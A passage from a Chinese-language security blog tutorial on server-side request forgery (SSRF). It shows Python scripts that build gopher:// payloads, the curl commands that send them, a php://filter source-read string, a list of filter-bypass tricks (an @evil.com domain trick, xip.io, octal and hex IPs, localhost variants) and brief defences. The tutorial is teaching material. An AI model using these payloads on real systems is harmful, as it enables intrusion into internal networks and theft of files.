+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">payload =\</span><br><span class="line">&quot;&quot;&quot;GET /echo.php?whoami=Bunny HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">&quot;&quot;&quot;  </span><br><span class="line"># 注意后面一定要有回车，回车结尾表示http请求结束</span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class="line">result = &#x27;gopher://ip:80/&#x27;+&#x27;_&#x27;+new</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>执行</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl </span><br><span class="line">gopher://ip:80/_GET%20/echo.php%3Fwhoami%3DBunny%20HTTP/1.1%0D%0AHost%3A%20192.168.1.1%0D%0A</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="发送POST请求"><a href="#发送POST请求" class="headerlink" title="发送POST请求"></a>发送POST请求</h3><ul>
+<li>测试代码</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// echo.php</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hello &quot;.$_POST[&quot;whoami&quot;].&quot;\n&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>抓包</li>
+</ul>
+<p>POST、Host、Content-Type、Content-Length是POST请求必须的。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /echo.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 12</span><br><span class="line"></span><br><span class="line">whoami=Bunny</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>利用脚本生成payload</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">payload =\</span><br><span class="line">&quot;&quot;&quot;POST /echo.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 12</span><br><span class="line"></span><br><span class="line">whoami=Bunny</span><br><span class="line">&quot;&quot;&quot;  </span><br><span class="line"># 注意后面一定要有回车，回车结尾表示http请求结束</span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class="line">result = &#x27;gopher://ip:80/&#x27;+&#x27;_&#x27;+new</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>执行</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://ip:80/_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%20192.168.1.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="攻击内网redis"><a href="#攻击内网redis" class="headerlink" title="攻击内网redis"></a>攻击内网redis</h2><p>这篇文章：<a class="link"   target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/" >https://blog.chaitin.cn/gopher-attack-surfaces/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=php://filter/convert.base64-encode/resource=代码页面</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="0x05-绕过"><a href="#0x05-绕过" class="headerlink" title="0x05 绕过"></a>0x05 绕过</h1><h2 id="利用HTTP基本身份认证的方式绕过"><a href="#利用HTTP基本身份认证的方式绕过" class="headerlink" title="利用HTTP基本身份认证的方式绕过"></a>利用HTTP基本身份认证的方式绕过</h2><ul>
+<li>目标代码限制访问的域名只能为 <code>http://www.xxx.com</code>,那我们可以采用利用HTTP基本身份认证的方式绕过，即<code>http://www.xxx.com@www.evil.com</code></li>
+</ul>
+<h2 id="利用302跳转绕过内网IP"><a href="#利用302跳转绕过内网IP" class="headerlink" title="利用302跳转绕过内网IP"></a>利用302跳转绕过内网IP</h2><ul>
+<li>采用短地址绕过</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.s-3.cn/</span><br><span class="line">https://my5353.com/</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>利用<code>http://xip.io</code>绕过</li>
+</ul>
+<p>不论什么ip，域名加上xip.io都会回归原本的地址，类似的还有<code>http://sslip.io</code>和<code>http://nip.io</code></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1.xip.io/flag.php -&gt; http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://www.sojson.com/hexconvert.html</span><br><span class="line"></span><br><span class="line">127.0.0.1</span><br><span class="line">八进制:</span><br><span class="line">0177.0.0.1</span><br><span class="line">十六进制:</span><br><span class="line">0x7f.0.0.1</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用[::]"></a>利用[::]</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用[::]绕过localhost </span><br><span class="line">http://[::]:80   -&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="指向127-0-0-1"><a href="#指向127-0-0-1" class="headerlink" title="指向127.0.0.1"></a>指向127.0.0.1</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:80</span><br><span class="line">http://127.0.0.1:443</span><br><span class="line">http://127.0.0.1:22</span><br><span class="line">http://127.1:80</span><br><span class="line">http://0</span><br><span class="line">http://0.0.0.0:80</span><br><span class="line">http://localhost:80</span><br><span class="line">http://[::]:80/</span><br><span class="line">http://[::]:25/ SMTP</span><br><span class="line">http://[::]:3128/ Squid</span><br><span class="line">http://[0000::1]:80/</span><br><span class="line">http://[0:0:0:0:0:ffff:127.0.0.1]/thefile</span><br><span class="line">http://①②⑦.⓪.⓪.⓪</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="用句号绕过"><a href="#用句号绕过" class="headerlink" title="用句号绕过"></a>用句号绕过</h2><ul>
+<li>PHP &gt; 5.5.9</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127。0。0。1 -&gt; 127.0.0.1</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="0x06-防御"><a href="#0x06-防御" class="headerlink" title="0x06 防御"></a>0x06 防御</h1><p>1.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符号标准。<br>2.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。<br>3.限制请求的端口为http常用的端口，比如80，443，8080，8090。<br>4.黑名单内网IP，避免应用被用来获取内网数据，攻击内网。<br>5.禁用不需要的协议，仅仅允许http和https请求，可以防止类似file:&#x2F;&#x2F;、gopher:&#x2F;&#x2F;等协议引起的问题。</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> SSRF</li>
+        <li><strong>作者:</strong> Chiexf</li>
+        <li><strong>创建于:</strong> 2023-09-01 00:00:00</li>
+        
+            <li>
+                <strong>更新于:</strong> 2023-10-19 20:53:31
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://redefine.ohevan.com/2023/09/01/Web安全/SSRF/
+        </li>
+        <li>
+            <strong>版权声明:</strong> 本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a> 进行许可。
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/SSRF/">#SSRF</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2023/09/03/Web%E5%AE%89%E5%85%A8/XXE%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">XXE</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/08/31/Web%E5%AE%89%E5%85%A8/CSRF/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">CSRF</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">SSRF</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-%E6%A6%82%E5%BF%B5"><span class="nav-text">0x00 概念</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%8E%9F%E7%90%86"><span class="nav-text">0x01 原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-SSRF%E6%BC%8F%E6%B4%9E%E7%94%A8%E9%80%94"><span class="nav-text">0x02 SSRF漏洞用途</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E4%BA%A7%E7%94%9F%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-text">0x03 产生漏洞的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#file-get-contents"><span class="nav-text">file_get_contents()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fsockopen"><span class="nav-text">fsockopen()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#curl-exec"><span class="nav-text">curl_exec()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#readfile"><span class="nav-text">readfile()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fopen"><span class="nav-text">fopen()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">0x04 SSRF漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRf%E4%B8%AD%E7%9A%84URL%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-text">SSRf中的URL伪协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B"><span class="nav-text">案例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-text">伪协议读取文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%AD%98%E6%B4%BB"><span class="nav-text">探测内网主机存活</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3"><span class="nav-text">扫描内网端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gopher%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8"><span class="nav-text">gopher协议利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E5%90%84%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E9%99%90%E5%88%B6"><span class="nav-text">在各编程语言中的限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%8F%E8%AE%AE%E6%A0%BC%E5%BC%8F"><span class="nav-text">协议格式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E9%80%81GET%E8%AF%B7%E6%B1%82"><span class="nav-text">发送GET请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E9%80%81POST%E8%AF%B7%E6%B1%82"><span class="nav-text">发送POST请求</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91redis"><span class="nav-text">攻击内网redis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-text">读取源代码</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-%E7%BB%95%E8%BF%87"><span class="nav-text">0x05 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8HTTP%E5%9F%BA%E6%9C%AC%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%9A%84%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="nav-text">利用HTTP基本身份认证的方式绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8302%E8%B7%B3%E8%BD%AC%E7%BB%95%E8%BF%87%E5%86%85%E7%BD%91IP"><span class="nav-text">利用302跳转绕过内网IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="nav-text">进制转换</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-text">利用[::]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%87%E5%90%91127-0-0-1"><span class="nav-text">指向127.0.0.1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E5%8F%A5%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-text">用句号绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-%E9%98%B2%E5%BE%A1"><span class="nav-text">0x06 防御</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">Chiexf</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a> 驱动</span>
+                <br>
+            <span class="theme-version-container">主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.3.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+
+</main>
+
+
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+        ],
+        containers: ["#swup"],
+    });
+
+    swup.on("pageView", () => {
+        Global.refresh();
+    });
+
+    // if (document.readyState === "complete") {
+    //
+    // } else {
+    //     document.addEventListener("DOMContentLoaded", () => init());
+    // }
+</script>
+
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+<script src="/js/layouts/categoryList.js"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+</body>
+</html>
